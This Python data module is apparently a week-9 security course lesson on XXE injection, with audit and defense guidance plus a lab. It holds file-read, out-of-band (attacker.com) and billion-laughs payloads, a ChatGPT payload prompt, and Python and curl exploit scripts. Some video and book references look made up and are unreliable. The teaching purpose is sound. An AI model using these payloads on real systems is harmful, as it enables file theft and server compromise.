WEEK_9_DATA = {
    "week_number": 9,
    "title": "XML External Entity (XXE) Injection",
    "short_desc": "Inject external XML DTD entities to read local system files (`/etc/passwd`), execute SSRF, and cause Denial of Service.",
    "flag": "FLAG{xxe_entity_file_read_8832}",

    "analogy": """XML External Entity (XXE) Injection is like ordering a custom book print where you tell the publisher: 'On page 5, insert whatever text is currently inside the bank president's private ledger at file path /etc/passwd.' Because the printer's layout software blindly evaluates external file reference macros, it prints the bank president's secrets directly on page 5 of your book!""",

    "overview": """XML External Entity (XXE) injection arises when an application parses XML input from untrusted sources without disabling external entity resolution (DOCTYPE DTDs). By defining custom external entities (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`), an attacker can force the XML parser to read sensitive local files, make internal SSRF network requests, or trigger Billion Laughs XML bomb Denial of Service (DoS) attacks.""",

    "learning_objectives": [
        "Understand XML DTD (Document Type Definition) structure and entity definition syntax.",
        "Execute In-Band XXE to exfiltrate local files (`/etc/passwd`, `C:\\Windows\\win.ini`).",
        "Perform Out-of-Band (OOB) XXE using external DTD files and parameter entities.",
        "Convert JSON requests to XML format to test hidden XML parser endpoints."
    ],

    "hunters_perspective": """XXE is a high-severity (P1/P2) finding in modern web apps. Bug bounty hunters look for endpoints accepting XML data (e.g., SOAP web services, office document parsers like `.docx`, `.xlsx`, `.svg` image uploads, and SAML authentication flows). Hunters inject DTD declarations into the XML body and verify if system files or external HTTP callbacks are returned.""",

    "root_cause": """The root cause is insecure XML parser defaults. Standard XML parsing libraries in Python (`xml.etree`), Java (`DocumentBuilderFactory`), and PHP (`DOMDocument`) enable external entity resolution by default unless developers explicitly set `resolve_entities=False` or disable DTD processing (`feature/disallow-doctype-decl`).""",

    "code_audit_manual": """Code Review Manual for XXE Prevention:
1. Search codebase for XML parsers: `xml.etree.ElementTree`, `minidom`, `lxml`, `DOMDocument`, `SAXParser`.
2. Check DTD resolution settings: ensure `resolve_entities=False` and `no_network=True` are configured.
3. Inspect file upload handlers for XML-based file types: `.docx`, `.xlsx`, `.svg`, `.pdf`, `.xml`.
4. Check SAML SSO implementation: ensure SAML responses are parsed with secure XML parsers.""",

    "payload_logic": {
        "explanation": "XXE payloads require defining a DOCTYPE header with a custom SYSTEM entity, then referencing the entity within an XML tag element.",
        "payloads": [
            "File Read Payload: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]><data>&xxe;</data>",
            "Windows File Read: <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///c:/windows/win.ini\"> ]><data>&xxe;</data>",
            "OOB XXE Payload: <!DOCTYPE foo [ <!ENTITY % xxe SYSTEM \"http://attacker.com/evil.dtd\"> %xxe; ]>",
            "Billion Laughs DoS: <!DOCTYPE lolz [ <!ENTITY lol \"lol\"><!ENTITY lol1 \"&lol;&lol;&lol;&lol;\">... ]>"
        ]
    },

    "burp_suite_masterclass": """Burp Suite XXE Masterclass:
1. Intercept Target XML Request: Capture POST request with `Content-Type: application/xml` or `text/xml`.
2. Content-Type Tampering: If request is JSON (`Content-Type: application/json`), convert body to XML and change Content-Type header to `application/xml`.
3. Inject DTD Entity: Add `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>` at the top of the XML body.
4. Replace XML tag value with `&xxe;` and inspect response body in Repeater for `/etc/passwd` contents.""",

    "dual_perspective": {
        "red_team": "Offensive Operations: Locate SVG image upload endpoint, embed XXE payload in SVG XML source `<svg><text>&xxe;</text></svg>`, upload image, view rendered SVG or error output to read internal database secrets or system files.",
        "blue_team": "Defensive Posture: Completely disable DTD (Document Type Declarations) processing in all XML parsers. In Python `defusedxml` library, use `defusedxml.ElementTree`. Enforce strict content-type validation and prefer JSON over XML formats where possible."
    },

    "resources": {
        "portswigger_title": "PortSwigger Web Security Academy - XML External Entity (XXE) Injection",
        "portswigger_url": "https://portswigger.net/web-security/xxe",
        "owasp_title": "OWASP Top 10:2021 - A05:2021-Security Misconfiguration (XXE)",
        "owasp_url": "https://owasp.org/Top10/A05_2021-Security_Misconfiguration/"
    },

    "textbook_cross_references": [
        {
            "book_name": "The Web Application Hacker's Handbook",
            "chapter_and_pages": "Chapter 10: Attacking Backend Components (pp. 385-410)",
            "sub_chapter": "10.5 XML External Entity Vulnerabilities",
            "analysis": "Stuttard & Pinto present the core mechanics of DTD parameter entities, Out-of-Band exfiltration, and parsing engine flaws."
        },
        {
            "book_name": "Bug Bounty Bootcamp",
            "chapter_and_pages": "Chapter 10: XML External Entity Injection (pp. 187-194)",
            "sub_chapter": "10.3 SVG & Office Document XXE Vectors",
            "analysis": "Vickie Li demonstrates embedding XXE payloads in SVG images, DOCX files, and SAML assertions."
        },
        {
            "book_name": "Real-World Bug Hunting",
            "chapter_and_pages": "Chapter 9: XML External Entity Injection (pp. 193-210)",
            "sub_chapter": "9.2 Exploiting File Uploads & Out-of-Band XXE",
            "analysis": "Peter Yaworski reviews real bug bounty writeups against Facebook and Twitter where XXE yielded local system file access."
        },
        {
            "book_name": "Bug Bounty Tips & Tricks using ChatGPT",
            "chapter_and_pages": "Chapter 10: XXE Payload Crafting (pp. 181-200)",
            "sub_chapter": "10.1 Generating Blind OOB XML Schemas",
            "analysis": "Barbosa shows using AI to generate multi-nested DTD parameter entity schemes for blind exfiltration."
        },
        {
            "book_name": "Bug Bounty from Scratch",
            "chapter_and_pages": "Chapter 11: Advanced Injection Attacks (pp. 243-265)",
            "sub_chapter": "11.1 JSON-to-XML Conversion Attacks",
            "analysis": "Vazquez & Javier demonstrate converting REST JSON endpoints to XML to trigger legacy backend XML parsers."
        },
        {
            "book_name": "Automate the Boring Stuff with Python",
            "chapter_and_pages": "Chapter 12: Web Scraping & XML Parsing (pp. 267-300)",
            "sub_chapter": "12.8 Safe Parsing with defusedxml",
            "analysis": "Sweigart provides practical code examples demonstrating vulnerabilities in standard xml.etree vs defusedxml."
        },
        {
            "book_name": "Black Hat Python",
            "chapter_and_pages": "Chapter 5: Web Attacks (pp. 75-98)",
            "sub_chapter": "5.6 Automated XXE Payload Injector",
            "analysis": "Seitz demonstrates building Python scripts to send XML DTD payloads to target web forms."
        }
    ],

    "video_workstation": [
        {
            "creator": "David Bombal",
            "title": "XXE Injection Explained: How External Entities Read Private Files",
            "youtube_url": "https://www.youtube.com/watch?v=9-4-u0i-H-2",
            "analysis_text": "David Bombal explains XML DTD structures, showing step-by-step how XXE extracts `/etc/passwd`."
        },
        {
            "creator": "Vickie Li",
            "title": "XXE Injection in Bug Bounties: SVG & SAML Attacks",
            "youtube_url": "https://www.youtube.com/watch?v=1-s5e5c7W-2",
            "analysis_text": "Vickie Li demonstrates finding XXE in file upload handlers and exploiting SAML single-sign-on endpoints."
        },
        {
            "creator": "Ryan John",
            "title": "Out-of-Band (OOB) XXE & DTD Parameter Entity Masterclass",
            "youtube_url": "https://www.youtube.com/watch?v=5-v3u-4-W-6",
            "analysis_text": "Ryan John presents a complete guide to constructing external DTD files for blind XXE data exfiltration."
        },
        {
            "creator": "John Hammond",
            "title": "XXE Exploitation & JSON-to-XML Parsing Tricks",
            "youtube_url": "https://www.youtube.com/watch?v=6-w3u-5-X-7",
            "analysis_text": "John Hammond performs a live demonstration testing web application endpoints for hidden XML entity parsing."
        }
    ],

    "case_studies": {
        "reports": [
            {
                "target": "Facebook Bug Bounty Program",
                "title": "XXE in Open Graph Document Parser Exposes Internal Servers",
                "bounty": "$33,500",
                "summary": "A researcher embedded a custom XXE DTD entity into a web page scraped by Facebook's Open Graph crawler, reading internal files."
            },
            {
                "target": "Twitter Bug Bounty Program",
                "title": "XXE Injection via SVG Image Upload Handler",
                "bounty": "$10,080",
                "summary": "Analyst uploaded an SVG file containing external entity references, allowing system file extraction from image processing servers."
            }
        ],
        "programs": [
            {
                "name": "Meta / Facebook Bug Bounty",
                "platform": "Bugcrowd / Direct",
                "scope": "*.facebook.com",
                "beginner_friendly": True
            },
            {
                "name": "Twitter / X Bug Bounty",
                "platform": "HackerOne",
                "scope": "*.twitter.com",
                "beginner_friendly": True
            }
        ],
        "ai_hunting_guide": "Prompting ChatGPT for XXE DTD: Supply XML structure: 'Construct a valid XML DOCTYPE DTD payload that defines an external entity pointing to /etc/passwd and places the entity reference inside the <name> tag: [INSERT XML]'"
    },

    "playground": {
        "lab_a": {
            "walkthrough": "Guided CTF: Inspect XML body: `<data><name>Test</name></data>`. Add DOCTYPE DTD `<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/flag.txt\"> ]>` and change `<name>&xxe;</name>`.",
            "guided_step": "Step 1: Submit POST request to `/lab-playground/week-9/target/` with XML payload containing `<!ENTITY xxe SYSTEM \"file:///etc/flag.txt\">`.\nStep 2: Inspect response body.\nStep 3: Extract Flag: FLAG{xxe_entity_file_read_8832}"
        },
        "lab_b": {
            "instructions": "Unguided CTF Challenge: Access the interactive target playground endpoint `/lab-playground/week-9/target/`. Intercept XML requests, inject external entity definitions, and extract the system flag."
        }
    },

    "automation_scripts": {
        "python_script": r"""# Python XXE Payload Injector (exploit_week9.py)
import requests
import sys

XXE_PAYLOAD = '''<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/flag.txt"> ]>
<request>
    <user>&xxe;</user>
</request>'''

def exploit_xxe(target_url):
    print(f"[*] Sending XXE Payload to: {target_url}")
    headers = {"Content-Type": "application/xml"}
    res = requests.post(target_url, data=XXE_PAYLOAD, headers=headers)
    print(f"[*] Response Status: {res.status_code}")
    if "FLAG{" in res.text:
        print(f"[!] SUCCESS: XXE Exfiltration Successful!")
        print(f"    - Body: {res.text.strip()}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000/lab-playground/week-9/target/"
    exploit_xxe(target)
""",
        "bash_script": """#!/bin/bash
# Bash XXE Tester (recon_week9.sh)
TARGET_URL="http://localhost:8000/lab-playground/week-9/target/"

echo "[*] Sending XXE XML payload to $TARGET_URL"
curl -s -X POST -H "Content-Type: application/xml" -d '<?xml version="1.0"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/flag.txt"> ]><request><user>&xxe;</user></request>' "$TARGET_URL" | grep -i "FLAG{"
"""
    }
}
